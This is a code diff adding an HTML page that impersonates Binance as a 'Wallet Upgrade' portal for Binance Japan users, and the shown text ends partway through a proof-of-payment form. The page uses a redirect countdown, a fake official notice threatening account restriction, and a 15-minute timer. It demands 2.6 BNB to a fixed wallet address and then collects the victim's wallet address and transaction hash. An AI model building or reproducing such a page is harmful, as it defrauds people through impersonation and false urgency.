@@ -1,0 +1,1391 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance Wallet Upgrade - Secure Verification Portal</title>
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Canvas Confetti for Approval Celebration -->
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        binance: {
+                            yellow: '#F0B90B',
+                            yellowHover: '#FCD535',
+                            bgPrimary: '#0B0E11',
+                            bgSecondary: '#181A20',
+                            bgCard: '#1E2329',
+                            bgInput: '#2B313A',
+                            border: '#2B313A',
+                            textMain: '#EAECEF',
+                            textMuted: '#848E9C',
+                            green: '#0ECB81',
+                            red: '#F6465D'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0B0E11;
+            color: #EAECEF;
+            overflow-x: hidden;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        /* Prevent unwanted horizontal overflow on mobile viewports */
+        html, body {
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+
+        /* Hide Scrollbars globally across all browsers while retaining touch & mouse scrollability */
+        ::-webkit-scrollbar {
+            display: none !important;
+            width: 0px !important;
+            height: 0px !important;
+        }
+
+        * {
+            -ms-overflow-style: none !important;  /* IE and Edge */
+            scrollbar-width: none !important;  /* Firefox */
+        }
+
+        /* Pulse & Spin Animations */
+        @keyframes pulse-glow {
+            0%, 100% { box-shadow: 0 0 15px rgba(240, 185, 11, 0.2); }
+            50% { box-shadow: 0 0 30px rgba(240, 185, 11, 0.5); }
+        }
+        .pulse-yellow {
+            animation: pulse-glow 2.5s infinite;
+        }
+
+        @keyframes spin-slow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .animate-spin-slow {
+            animation: spin-slow 8s linear infinite;
+        }
+
+        @keyframes spin-reverse {
+            0% { transform: rotate(360deg); }
+            100% { transform: rotate(0deg); }
+        }
+        .animate-spin-reverse {
+            animation: spin-reverse 12s linear infinite;
+        }
+
+        /* Binance Loader Styles */
+        .binance-loader {
+            width: 48px;
+            height: 48px;
+            aspect-ratio: 1 / 1;
+            overflow: hidden;
+            display: inline-block;
+        }
+        .binance-loader-sm {
+            width: 24px;
+            height: 24px;
+            aspect-ratio: 1 / 1;
+            overflow: hidden;
+            display: inline-block;
+        }
+        .binance-loader-lg {
+            width: 64px;
+            height: 64px;
+            aspect-ratio: 1 / 1;
+            overflow: hidden;
+            display: inline-block;
+        }
+
+        .binance-loader svg, .binance-loader-sm svg, .binance-loader-lg svg {
+            display: block;
+            width: 100%;
+            height: 100%;
+        }
+
+        .binance-part {
+            fill: #f0b90b; /* Binance yellow */
+            transform-origin: center;
+            animation: binance-pulse 0.5s infinite ease-in-out;
+        }
+
+        .top-chevron { animation-delay: 0.0s; }
+        .left-diamond { animation-delay: 0.07s; }
+        .center-diamond { animation-delay: 0.14s; }
+        .right-diamond { animation-delay: 0.07s; }
+        .bottom-chevron { animation-delay: 0.21s; }
+
+        @keyframes binance-pulse {
+            0%, 100% {
+                opacity: 0.25;
+                transform: scale(0.92);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.08);
+            }
+        }
+
+        /* Custom Dropzone Styling */
+        .dropzone-dashed {
+            background-image: url("data:image/svg+xml,%3csvg width='100%25' height='100%25' xmlns='http://www.w3.org/2000/svg'%3e%3crect width='100%25' height='100%25' fill='none' rx='12' ry='12' stroke='%23474D57' stroke-width='2' stroke-dasharray='8%2c 8' stroke-dashoffset='0' stroke-linecap='square'/%3e%3c/svg%3e");
+        }
+        .dropzone-dashed:hover {
+            background-image: url("data:image/svg+xml,%3csvg width='100%25' height='100%25' xmlns='http://www.w3.org/2000/svg'%3e%3crect width='100%25' height='100%25' fill='none' rx='12' ry='12' stroke='%23F0B90B' stroke-width='2' stroke-dasharray='8%2c 8' stroke-dashoffset='0' stroke-linecap='square'/%3e%3c/svg%3e");
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between antialiased selection:bg-binance-yellow selection:text-black bg-[#0B0E11]">
+
+    <!-- Toast Notification Container -->
+    <div id="toast-container" class="fixed top-5 right-5 z-50 flex flex-col gap-2 pointer-events-none"></div>
+
+    <!-- GLOBAL BINANCE LOADING OVERLAY -->
+    <div id="global-binance-loader" class="fixed inset-0 z-50 bg-[#0B0E11]/95 backdrop-blur-md flex flex-col items-center justify-center p-6 text-center hidden transition-opacity duration-300">
+        <div class="relative flex flex-col items-center justify-center p-8 bg-binance-bgCard/80 border border-binance-yellow/30 rounded-2xl shadow-2xl max-w-sm w-full pulse-yellow">
+            
+            <!-- Binance Animated SVG Loader -->
+            <div class="binance-loader-lg mb-4">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120" width="100%" height="100%">
+                    <path class="binance-part top-chevron" d="M60,10 L84.7,34.7 L72.3,47.1 L60,34.7 L47.7,47.1 L35.3,34.7 Z" />
+                    <polygon class="binance-part left-diamond" points="17.7,60 30.1,47.6 42.5,60 30.1,72.4" />
+                    <polygon class="binance-part center-diamond" points="60,47.6 72.4,60 60,72.4 47.6,60" />
+                    <polygon class="binance-part right-diamond" points="102.3,60 89.9,47.6 77.5,60 89.9,72.4" />
+                    <path class="binance-part bottom-chevron" d="M60,110 L35.3,85.3 L47.7,72.9 L60,85.3 L72.3,72.9 L84.7,85.3 Z" />
+                </svg>
+            </div>
+
+            <!-- Loader Status Text -->
+            <div id="global-loader-title" class="text-base font-bold text-white tracking-wide uppercase mb-1">
+                Processing...
+            </div>
+            <div id="global-loader-subtitle" class="text-xs text-binance-textMuted font-mono">
+                Please wait while connecting to Binance Node
+            </div>
+
+            <!-- Loader Progress Line -->
+            <div class="w-full bg-binance-bgPrimary h-1.5 rounded-full overflow-hidden mt-5 border border-binance-border">
+                <div class="bg-binance-yellow h-full w-full animate-pulse"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 1: REDIRECTION POP-UP OVERLAY -->
+    <div id="screen-redirection" class="fixed inset-0 z-50 bg-[#0B0E11] flex flex-col items-center justify-center p-6 text-center select-none transition-opacity duration-500">
+        <div class="max-w-xl w-full flex flex-col items-center">
+            
+            <!-- Spinning Multi-Ring Circle with Live Text inside -->
+            <div class="relative w-64 h-64 sm:w-72 sm:h-72 flex items-center justify-center mb-10">
+                <!-- Outer Animated Ring -->
+                <div class="absolute inset-0 rounded-full border-2 border-dashed border-binance-yellow/40 animate-spin-slow"></div>
+                
+                <!-- Secondary Reverse Ring -->
+                <div class="absolute inset-3 rounded-full border-2 border-t-binance-yellow border-r-transparent border-b-binance-yellow/30 border-l-transparent animate-spin-reverse"></div>
+                
+                <!-- Inner Glowing Ring -->
+                <div class="absolute inset-6 rounded-full border-4 border-binance-bgCard border-t-binance-yellow animate-spin shadow-lg shadow-binance-yellow/20"></div>
+
+                <!-- Center Live Text Container -->
+                <div class="relative z-10 flex flex-col items-center justify-center p-4">
+                    <!-- Binance Animated Loader -->
+                    <div class="binance-loader w-12 h-12 mb-3">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120" width="100%" height="100%">
+                            <path class="binance-part top-chevron" d="M60,10 L84.7,34.7 L72.3,47.1 L60,34.7 L47.7,47.1 L35.3,34.7 Z" />
+                            <polygon class="binance-part left-diamond" points="17.7,60 30.1,47.6 42.5,60 30.1,72.4" />
+                            <polygon class="binance-part center-diamond" points="60,47.6 72.4,60 60,72.4 47.6,60" />
+                            <polygon class="binance-part right-diamond" points="102.3,60 89.9,47.6 77.5,60 89.9,72.4" />
+                            <path class="binance-part bottom-chevron" d="M60,110 L35.3,85.3 L47.7,72.9 L60,85.3 L72.3,72.9 L84.7,85.3 Z" />
+                        </svg>
+                    </div>
+                    <span class="text-xl sm:text-2xl font-black tracking-wider text-white flex items-center gap-1">
+                        Redirecting<span id="redirect-dots" class="text-binance-yellow inline-block w-8 text-left">....</span>
+                    </span>
+                    <span class="text-[11px] text-binance-textMuted uppercase tracking-widest mt-1 font-semibold">Please wait</span>
+                </div>
+            </div>
+
+            <!-- Redirection Description Text -->
+            <div class="space-y-4 max-w-lg">
+                <p class="text-lg sm:text-xl font-serif text-binance-textMain leading-relaxed">
+                    Transaction cannot be completed at the moment you will be automatically redirected to the 
+                    <span class="font-bold text-white tracking-wide underline decoration-binance-yellow decoration-2 underline-offset-4">
+                        Binance Japan Wallet Upgrade Page
+                    </span> 
+                    in <span id="initial-countdown-timer" class="text-binance-yellow font-bold text-2xl font-mono">10</span> seconds
+                </p>
+            </div>
+
+            <!-- Progress Indicator Bar -->
+            <div class="w-full max-w-md bg-binance-bgCard h-2 rounded-full overflow-hidden mt-8 border border-binance-border">
+                <div id="initial-progress-bar" class="bg-binance-yellow h-full w-full transition-all duration-1000 ease-linear"></div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- SCREEN 2: WELCOME & CONSENT NOTICE PAGE -->
+    <div id="screen-welcome" class="fixed inset-0 z-40 bg-[#0B0E11]/95 backdrop-blur-md flex items-center justify-center p-3 sm:p-6 hidden">
+        <div class="bg-binance-bgCard border border-binance-yellow/30 rounded-2xl max-w-3xl w-full max-h-[88vh] sm:max-h-[90vh] flex flex-col shadow-2xl overflow-hidden relative pulse-yellow">
+            
+            <!-- Header -->
+            <div class="bg-binance-bgSecondary px-4 sm:px-6 py-4 sm:py-5 border-b border-binance-border flex items-center justify-between shrink-0">
+                <div class="flex items-center space-x-2 sm:space-x-3">
+                    <div class="w-7 h-7 sm:w-8 sm:h-8 rounded-lg bg-binance-yellow/10 flex items-center justify-center text-binance-yellow font-bold text-xs sm:text-base">
+                        <i class="fa-solid fa-shield-halved text-binance-yellow"></i>
+                    </div>
+                    <h2 class="text-sm sm:text-xl font-extrabold tracking-wide uppercase text-white">BINANCE WALLET UPGRADE</h2>
+                </div>
+                <span class="text-[10px] sm:text-xs bg-binance-yellow/10 text-binance-yellow px-2.5 sm:px-3 py-1 rounded-full font-mono border border-binance-yellow/20">Official Notice</span>
+            </div>
+
+            <!-- Scrollable Content Container -->
+            <div class="p-4 sm:p-8 overflow-y-auto space-y-4 sm:space-y-6 text-xs sm:text-sm text-binance-textMain leading-relaxed font-sans border-b border-binance-border">
+                
+                <p class="text-binance-textMain text-justify">
+                    Binance is implementing a wallet upgrade designed to strengthen account security, improve compliance, and enable higher-value transaction capabilities for verified users. This upgrade includes enhancements to wallet infrastructure, identity verification (KYC) processes, transaction monitoring, and optional security features. Completing the upgrade ensures uninterrupted access to advanced services and reduces the risk of account restrictions or temporary deactivation when conducting large transactions..
+                </p>
+
+                <div class="space-y-3 bg-binance-bgPrimary/60 p-4 rounded-xl border border-binance-border">
+                    <h3 class="text-sm sm:text-base font-bold text-binance-yellow uppercase tracking-wide">Why the Upgrade Matters;</h3>
+                    
+                    <div class="space-y-2">
+                        <p>
+                            <strong class="text-white">Seamless high-value transactions:</strong> The upgraded wallet and verification framework are intended to allow users to execute large transfers and trades without the throttling or limits that apply to unverified or legacy accounts. Users who complete the upgrade will experience fewer manual reviews and faster settlement for high-figure transactions.
+                        </p>
+                        <p>
+                            <strong class="text-white">Reduced risk of restrictions or deactivation:</strong> Exchanges routinely apply automated controls to accounts that do not meet current compliance or security standards. Upgrading your wallet and completing any required verification minimizes the chance of automated holds, temporary suspensions, or deactivation triggered by unusual activity or regulatory flags.
+                        </p>
+                        <p>
+                            <strong class="text-white">Improved security posture:</strong> The upgrade typically brings stronger cryptographic protections, better key management, and optional multi-factor or hardware wallet integrations. These measures protect large balances and high-value transfers from compromise.
+                        </p>
+                        <p>
+                            <strong class="text-white">Regulatory and compliance alignment:</strong> As global and local regulations evolve, exchanges update their onboarding and transaction-monitoring systems. Upgrading aligns your account with the latest compliance requirements, helping preserve full functionality across jurisdictions.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="space-y-3 bg-binance-bgPrimary/60 p-4 rounded-xl border border-binance-border">
+                    <h3 class="text-sm sm:text-base font-bold text-binance-yellow uppercase tracking-wide">What Users Should Expect</h3>
+                    
+                    <div class="space-y-2">
+                        <p>
+                            <strong class="text-white">Security upgrades:</strong> Expect prompts to enable stronger authentication (e.g., 2FA, anti-phishing codes), review withdrawal allowlists, and consider hardware wallet or custodial options for very large holdings.
+                        </p>
+                        <p>
+                            <strong class="text-white">Temporary checks during transition:</strong> During the upgrade window, some accounts may be subject to additional, short-term review. Completing the requested steps promptly will minimize any service interruptions.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="space-y-2 bg-binance-bgPrimary/60 p-4 rounded-xl border border-binance-border">
+                    <h3 class="text-sm sm:text-base font-bold text-binance-yellow uppercase tracking-wide">Closing Summary</h3>
+                    <p class="text-justify">
+                        Undergoing the Binance wallet upgrade is an important, proactive step for any user who plans to transact at high values. It reduces the likelihood of service interruptions, aligns your account with current compliance and security standards, and enables smoother, faster processing of large transactions. Complete the upgrade and strengthen your security settings now to preserve full access and avoid potential restrictions or deactivation when you need to move significant funds.
+                    </p>
+                </div>
+
+                <!-- Consent Notice Requirement -->
+                <div class="bg-yellow-500/10 border border-yellow-500/30 p-4 rounded-xl space-y-2">
+                    <h4 class="font-bold text-binance-yellow text-sm uppercase flex items-center gap-2">
+                        <i class="fa-solid fa-file-contract"></i> Consent Notice
+                    </h4>
+                    <p class="text-xs text-binance-textMain">By proceeding, you acknowledge and agree that:</p>
+                    <ul class="list-disc list-inside text-xs text-binance-textMuted space-y-1 pl-1">
+                        <li>You have read and understood Binance’s Terms of Service and Privacy Policy.</li>
+                        <li>You consent to Binance collecting, processing, and storing your personal information in accordance with applicable laws and regulations.</li>
+                        <li>You understand that upgrading your account may require additional identity verification and compliance checks.</li>
+                        <li>You accept that Binance may share your information with regulatory authorities if required.</li>
+                    </ul>
+                </div>
+
+            </div>
+
+            <!-- Footer Action Button -->
+            <div class="bg-binance-bgSecondary px-6 py-4 flex items-center justify-end shrink-0">
+                <button id="btn-accept-consent" onclick="acceptWelcomeConsent()" class="w-full sm:w-auto bg-binance-yellow hover:bg-binance-yellowHover text-binance-bgPrimary font-bold px-8 py-3.5 rounded-xl transition shadow-xl shadow-binance-yellow/20 flex items-center justify-center gap-2 text-sm sm:text-base uppercase tracking-wider">
+                    <span>Accept & Continue</span>
+                    <i class="fa-solid fa-arrow-right"></i>
+                </button>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- MAIN APPLICATION CONTAINER -->
+    <div id="screen-main-app" class="hidden min-h-screen flex flex-col justify-between">
+        
+        <header class="border-b border-binance-border bg-binance-bgSecondary sticky top-0 z-30">
+            <div class="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-1.5 sm:gap-2 relative">
+                
+                <!-- Left: Logo & Binance Pay Badge -->
+                <div class="flex items-center space-x-1.5 sm:space-x-3 shrink-0">
+                    <div class="flex items-center space-x-1.5 sm:space-x-2 cursor-pointer" onclick="resetToInitialState()">
+                        <i class="fa-solid fa-arrow-up-right-dots text-binance-yellow text-lg sm:text-xl"></i>
+                        <span class="text-sm sm:text-xl font-bold tracking-wider text-white">Wallet Upgrade</span>
+                    </div>
+                    <span class="hidden md:inline-flex items-center gap-1.5 text-xs px-2.5 py-1 rounded bg-binance-bgInput text-binance-textMain font-medium border border-binance-border">
+                        <svg class="w-4 h-4 text-binance-yellow" viewBox="0 0 120 120" fill="currentColor">
+                            <path d="M60 0L33.7 26.3l13.1 13.1L60 26.3l13.2 13.1 13.1-13.1L60 0zm-33.7 33.7L0 60l26.3 26.3 13.1-13.1L26.3 60l13.1-13.1-13.1-13.2zm67.4 0L80.6 46.9 93.7 60l-13.1 13.1 13.1 13.1L120 60 93.7 33.7zM60 46.9L46.9 60 60 73.1 73.1 60 60 46.9zm-26.3 46.8L60 120l26.3-26.3-13.1-13.1L60 93.7l-13.2-13.1-13.1 13.1z"/>
+                        </svg>
+                        <span>BINANCE <span class="text-binance-yellow">PAY</span></span>
+                    </span>
+                </div>
+
+                <!-- Center Upgrade Badge -->
+                <div class="flex items-center gap-1 sm:gap-2 px-2 sm:px-4 py-1 sm:py-1.5 rounded-full bg-binance-bgPrimary border border-binance-yellow/50 shadow-inner shrink-0">
+                    <span class="relative flex h-2 sm:h-2.5 w-2 sm:w-2.5 shrink-0">
+                      <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-binance-yellow opacity-75"></span>
+                      <span class="relative inline-flex rounded-full h-2 sm:h-2.5 w-2 sm:w-2.5 bg-binance-yellow"></span>
+                    </span>
+                    <span id="header-stage-badge" class="text-[9px] sm:text-xs font-bold tracking-wide text-binance-yellow uppercase whitespace-nowrap">
+                        BASIC UPGRADE <span class="text-binance-textMuted font-semibold text-[8px] sm:text-[11px] lowercase hidden xs:inline">(minimum)</span>
+                    </span>
+                </div>
+
+                <!-- Right: Live Price Ticker & Admin Icon -->
+                <div class="flex items-center space-x-1.5 sm:space-x-3 shrink-0">
+                    <div class="flex items-center space-x-1 sm:space-x-2 bg-binance-bgPrimary px-2 sm:px-3 py-1 sm:py-1.5 rounded-lg border border-binance-border">
+                        <div class="flex items-center space-x-1">
+                            <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" alt="BNB" class="w-3.5 h-3.5 sm:w-5 sm:h-5" onerror="this.src='https://placehold.co/20x20/F0B90B/000000?text=B'">
+                            <span class="text-xs font-semibold hidden md:inline">BNB/JPY</span>
+                        </div>
+                        <span id="bnb-live-price" class="text-[11px] sm:text-sm font-mono font-bold text-binance-green">¥120,665</span>
+                        <span id="bnb-price-change" class="text-[9px] sm:text-xs text-binance-green flex items-center font-mono font-semibold"><i class="fa-solid fa-caret-up mr-0.5"></i>+1.19%</span>
+                    </div>
+
+                    <button onclick="openAdminDemoModal()" title="Admin Controls" class="text-xs bg-yellow-500/10 hover:bg-yellow-500/20 text-binance-yellow p-2 sm:p-2.5 rounded-lg border border-binance-yellow/30 font-mono flex items-center justify-center transition hover:scale-105 active:scale-95">
+                        <i class="fa-solid fa-sliders text-xs sm:text-sm"></i>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <main class="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8 py-4 sm:py-8 flex-1 w-full">
+            
+            <div class="mb-6 sm:mb-10 max-w-4xl mx-auto">
+                <div class="relative">
+                    <div class="absolute left-0 top-4 sm:top-5 transform -translate-y-1/2 h-1 bg-binance-bgInput w-full z-0"></div>
+                    <div id="step-progress-bar" class="absolute left-0 top-4 sm:top-5 transform -translate-y-1/2 h-1 bg-binance-yellow transition-all duration-500 z-0" style="width: 12%;"></div>
+
+                    <div class="flex items-center justify-between relative z-10">
+                        <div class="flex flex-col items-center">
+                            <div id="step-node-1" class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-binance-yellow text-binance-bgPrimary flex items-center justify-center font-bold text-xs sm:text-sm shadow-lg shadow-binance-yellow/20">
+                                1
+                            </div>
+                            <span class="text-[10px] sm:text-xs font-medium mt-1.5 sm:mt-2 text-binance-yellow text-center" id="step-label-1">Deposit Details</span>
+                        </div>
+
+                        <div class="flex flex-col items-center">
+                            <div id="step-node-2" class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-binance-bgCard text-binance-textMuted border-2 border-binance-border flex items-center justify-center font-bold text-xs sm:text-sm transition-all duration-300">
+                                2
+                            </div>
+                            <span class="text-[10px] sm:text-xs font-medium mt-1.5 sm:mt-2 text-binance-textMuted text-center" id="step-label-2">Submit Proof</span>
+                        </div>
+
+                        <div class="flex flex-col items-center">
+                            <div id="step-node-3" class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-binance-bgCard text-binance-textMuted border-2 border-binance-border flex items-center justify-center font-bold text-xs sm:text-sm transition-all duration-300">
+                                3
+                            </div>
+                            <span class="text-[10px] sm:text-xs font-medium mt-1.5 sm:mt-2 text-binance-textMuted text-center" id="step-label-3">Admin Approval</span>
+                        </div>
+
+                        <div class="flex flex-col items-center">
+                            <div id="step-node-4" class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-binance-bgCard text-binance-textMuted border-2 border-binance-border flex items-center justify-center font-bold text-xs sm:text-sm transition-all duration-300">
+                                <i class="fa-solid fa-check"></i>
+                            </div>
+                            <span class="text-[10px] sm:text-xs font-medium mt-1.5 sm:mt-2 text-binance-textMuted text-center" id="step-label-4">Redirect</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+                
+                <!-- Left Main Column: Form Views -->
+                <div class="lg:col-span-8 space-y-6">
+
+                    <div class="bg-binance-bgCard border border-binance-border rounded-2xl p-6 sm:p-8 shadow-2xl relative overflow-hidden">
+                        
+                        <div class="flex flex-wrap items-center justify-between pb-6 mb-6 border-b border-binance-border gap-4">
+                            <div>
+                                <div class="text-xs text-binance-textMuted uppercase tracking-wider font-semibold">Payment Gateway</div>
+                                <h1 class="text-2xl font-bold text-white mt-1 flex items-center gap-2">
+                                    BNB Smart Chain Deposit
+                                    <span class="bg-binance-yellow/10 text-binance-yellow text-xs px-2.5 py-0.5 rounded-full border border-binance-yellow/20 font-normal">BEP20</span>
+                                </h1>
+                            </div>
+                            <div class="bg-binance-bgPrimary px-4 py-2 rounded-xl border border-binance-border flex items-center space-x-3">
+                                <i class="fa-regular fa-clock text-binance-yellow text-lg"></i>
+                                <div>
+                                    <div class="text-[10px] text-binance-textMuted uppercase font-semibold">Price Guarantee</div>
+                                    <div id="timer-display" class="text-sm font-mono font-bold text-binance-yellow">14:59</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- VIEW 1: PAYMENT DEPOSIT & DETAILS -->
+                        <div id="view-deposit-step" class="space-y-6">
+                            
+                            <div class="bg-yellow-500/10 border border-yellow-500/20 rounded-xl p-4 flex items-start space-x-3">
+                                <i class="fa-solid fa-triangle-exclamation text-binance-yellow text-lg mt-0.5 shrink-0"></i>
+                                <div class="text-xs text-binance-textMain leading-relaxed">
+                                    <span class="font-bold text-binance-yellow">Important:</span> Send only <span class="font-bold">BNB (BEP20)</span> to this deposit address. Sending any other coin or using an unsupported network may result in loss of funds.
+                                </div>
+                            </div>
+
+                            <div class="grid grid-cols-1 md:grid-cols-12 gap-6 items-center">
+                                <!-- QR Code Box -->
+                                <div class="md:col-span-5 flex flex-col items-center justify-center p-4 bg-binance-bgPrimary rounded-xl border border-binance-border relative group">
+                                    <div class="bg-white p-3 rounded-lg shadow-md relative">
+                                        <img id="qr-code-img" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=0x9D9282733b5535cB916CF6Ee8a5ab32341E27B81&color=000000&bgcolor=FFFFFF" alt="BNB Payment QR" class="w-40 h-40 object-contain">
+                                        <div class="absolute inset-0 flex items-center justify-center pointer-events-none">
+                                            <div class="w-8 h-8 bg-binance-bgPrimary rounded-full p-1 border border-binance-yellow flex items-center justify-center shadow">
+                                                <svg class="w-5 h-5 text-binance-yellow" viewBox="0 0 120 120" fill="currentColor">
+                                                    <path d="M60 0L33.7 26.3l13.1 13.1L60 26.3l13.2 13.1 13.1-13.1L60 0zm-33.7 33.7L0 60l26.3 26.3 13.1-13.1L26.3 60l13.1-13.1-13.1-13.2zm67.4 0L80.6 46.9 93.7 60l-13.1 13.1 13.1 13.1L120 60 93.7 33.7zM60 46.9L46.9 60 60 73.1 73.1 60 60 46.9zm-26.3 46.8L60 120l26.3-26.3-13.1-13.1L60 93.7l-13.2-13.1-13.1 13.1z"/>
+                                                </svg>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <span class="text-[11px] text-binance-textMuted mt-3 flex items-center gap-1 text-center">
+                                        <i class="fa-solid fa-qrcode"></i> Scan with Binance App or Web3 Wallet
+                                    </span>
+                                </div>
+
+                                <!-- Deposit Address & Details -->
+                                <div class="md:col-span-7 space-y-4">
+                                    <div>
+                                        <label class="block text-xs font-semibold text-binance-textMuted uppercase mb-1">Required Deposit Amount</label>
+                                        <div class="flex items-center justify-between bg-binance-bgPrimary border border-binance-border rounded-xl p-3.5">
+                                            <div>
+                                                <div class="text-xl font-bold text-binance-yellow font-mono" id="deposit-bnb-amount">2.6 BNB</div>
+                                                <div class="text-xs text-binance-textMuted" id="deposit-jpy-amount">≈ ¥313,729 JPY</div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div>
+                                        <label class="block text-xs font-semibold text-binance-textMuted uppercase mb-1">Merchant Deposit Wallet Address (BEP20)</label>
+                                        <div class="relative">
+                                            <input type="text" id="merchant-wallet-address" readonly value="0x9D9282733b5535cB916CF6Ee8a5ab32341E27B81" class="w-full bg-binance-bgPrimary border border-binance-border rounded-xl pl-3 pr-20 sm:pr-24 py-3 text-[10px] sm:text-xs font-mono text-white focus:outline-none select-all truncate">
+                                            <button onclick="copyToClipboard(document.getElementById('merchant-wallet-address').value, 'Address copied to clipboard!')" class="absolute right-1.5 top-1.5 bottom-1.5 bg-binance-yellow hover:bg-binance-yellowHover text-binance-bgPrimary text-xs font-bold px-2.5 sm:px-3 rounded-lg transition flex items-center gap-1 shrink-0">
+                                                <i class="fa-regular fa-copy"></i> Copy
+                                            </button>
+                                        </div>
+                                    </div>
+
+                                    <div class="grid grid-cols-2 gap-3 pt-1">
+                                        <div class="bg-binance-bgPrimary border border-binance-border p-2.5 rounded-lg flex items-center justify-between">
+                                            <span class="text-[11px] text-binance-textMuted">Network</span>
+                                            <span class="text-xs font-semibold text-white">BNB Smart Chain</span>
+                                        </div>
+                                        <div class="bg-binance-bgPrimary border border-binance-border p-2.5 rounded-lg flex items-center justify-between">
+                                            <span class="text-[11px] text-binance-textMuted">Expected Time</span>
+                                            <span class="text-xs font-semibold text-binance-green">~ 3 Secs (15 Confs)</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="pt-4 border-t border-binance-border flex flex-col sm:flex-row items-center justify-between gap-4">
+                                <div class="text-xs text-binance-textMuted flex items-center gap-1.5">
+                                    <i class="fa-solid fa-lock text-binance-green"></i> 256-bit SSL Binance Encrypted Checkout
+                                </div>
+                                <button id="btn-made-payment" onclick="handleMadePaymentClick()" class="w-full sm:w-auto bg-binance-yellow hover:bg-binance-yellowHover text-binance-bgPrimary font-bold px-8 py-3.5 rounded-xl transition shadow-lg shadow-binance-yellow/10 flex items-center justify-center gap-2 text-sm">
+                                    <span>I Have Made The Payment</span>
+                                    <i class="fa-solid fa-arrow-right"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- VIEW 2: SUBMIT PAYMENT PROOF -->
+                        <div id="view-proof-step" class="space-y-6 hidden">
+                            <div class="flex items-center justify-between">
+                                <button onclick="goToStep(1)" class="text-xs text-binance-textMuted hover:text-binance-yellow flex items-center gap-1">
+                                    <i class="fa-solid fa-arrow-left"></i> Back to Deposit Details
+                                </button>
+                                <span class="text-xs text-binance-yellow font-semibold">Step 2 of 3</span>
+                            </div>
+
+                            <div class="bg-binance-bgPrimary p-4 rounded-xl border border-binance-border flex items-center justify-between">
+                                <div class="flex items-center space-x-3">
+                                    <div class="w-10 h-10 rounded-lg bg-yellow-500/10 flex items-center justify-center text-binance-yellow font-bold text-lg shrink-0">
+                                        <i class="fa-solid fa-file-invoice-dollar"></i>
+                                    </div>
+                                    <div>
+                                        <div class="text-xs text-binance-textMuted">Verifying Deposit For</div>
+                                        <div class="text-sm font-bold text-white"><span id="summary-bnb-val">2.6 BNB</span> (<span id="summary-jpy-val">≈ ¥313,729</span>)</div>
+                                    </div>
+                                </div>
+                                <span class="bg-yellow-500/10 text-binance-yellow text-xs px-2.5 py-1 rounded-md font-mono border border-yellow-500/20">Awaiting Proof</span>
+                            </div>
+
+                            <form id="proof-form" onsubmit="handleProofSubmit(event)" class="space-y-5">
+                                <div>
+                                    <label class="block text-xs font-semibold text-binance-textMuted uppercase mb-1.5">
+                                        Your Sending Wallet Address <span class="text-binance-red">*</span>
+                                    </label>
+                                    <div class="relative">
+                                        <span class="absolute left-3.5 top-3.5 text-binance-textMuted text-xs"><i class="fa-solid fa-wallet"></i></span>
+                                        <input type="text" id="user-wallet-input" required placeholder="Enter your 0x... wallet address used for payment" class="w-full bg-binance-bgPrimary border border-binance-border focus:border-binance-yellow rounded-xl pl-9 pr-3 py-3 text-xs text-white placeholder-binance-textMuted focus:outline-none transition">
+                                    </div>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-semibold text-binance-textMuted uppercase mb-1.5">
+                                        Transaction Hash (TxHash) <span class="text-binance-red">*</span>
+                                    </label>
+                                    <div class="relative">
+                                        <span class="absolute left-3.5 top-3.5 text-binance-textMuted text-xs"><i class="fa-solid fa-hashtag"></i></span>
+                                        <input type="text" id="tx-hash-input" required placeholder="0x..." class="w-full bg-binance-bgPrimary border border-binance-border focus:border-binance-yellow rounded-xl pl-9 pr-3 py-3 text-xs text-white placeholder-binance-textMuted focus:outline-none transition font-mono">
+                                    </div>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-semibold text-binance-textMuted uppercase mb-1.5">
+                                        Upload Receipt / Payment Screenshot <span class="text-binance-textMuted font-normal">(Optional)</span>
+                                    </label>
